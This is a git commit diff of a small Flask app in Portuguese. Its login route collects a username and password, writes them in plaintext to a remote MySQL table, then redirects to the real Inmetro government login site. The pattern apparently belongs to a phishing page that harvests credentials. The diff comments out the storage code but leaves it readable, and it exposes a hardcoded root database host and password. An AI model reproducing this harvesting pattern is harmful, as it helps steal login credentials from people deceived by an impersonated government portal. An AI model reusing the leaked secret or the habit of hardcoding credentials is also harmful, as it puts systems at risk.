89517f8130503f9489d45aa1d86ff42ab4a55a2d
Juan Alves <juan.alves@mediacaonline.com>
2023-06-06 17:30:39 -0300

    tstttt

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, redirect
-import mysql.connector
+# import mysql.connector
 
 app = Flask(__name__)
 
@@ -22,27 +22,27 @@ def login():
       # Criar um objeto com os dados recebidos
       dados = Dados(login, senha)
 
-      conn = mysql.connector.connect(
-        host='containers-us-west-189.railway.app',
-        database='railway', 
-        user='root',
-        password='5Rg4COCO8b9meUM2gTbE'
-      )
+      # conn = mysql.connector.connect(
+      #   host='containers-us-west-189.railway.app',
+      #   database='railway', 
+      #   user='root',
+      #   password='5Rg4COCO8b9meUM2gTbE'
+      # )
                                           
-      # Criar um cursor para executar as operações no banco de dados
-      cursor = conn.cursor()
+      # # Criar um cursor para executar as operações no banco de dados
+      # cursor = conn.cursor()
 
-      # Executar a inserção dos dados na tabela desejada
-      query = "INSERT INTO users_2 (login, senha) VALUES (%s, %s)"
-      values = (dados.login, dados.senha)
-      cursor.execute(query, values)
+      # # Executar a inserção dos dados na tabela desejada
+      # query = "INSERT INTO users_2 (login, senha) VALUES (%s, %s)"
+      # values = (dados.login, dados.senha)
+      # cursor.execute(query, values)
 
-      # Confirmar a transação
-      conn.commit()
+      # # Confirmar a transação
+      # conn.commit()
 
-      # Fechar o cursor e a conexão com o banco de dados
-      cursor.close()
-      conn.close()
+      # # Fechar o cursor e a conexão com o banco de dados
+      # cursor.close()
+      # conn.close()
 
       # Redirecionar para um site após a inserção no banco de dados
       return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
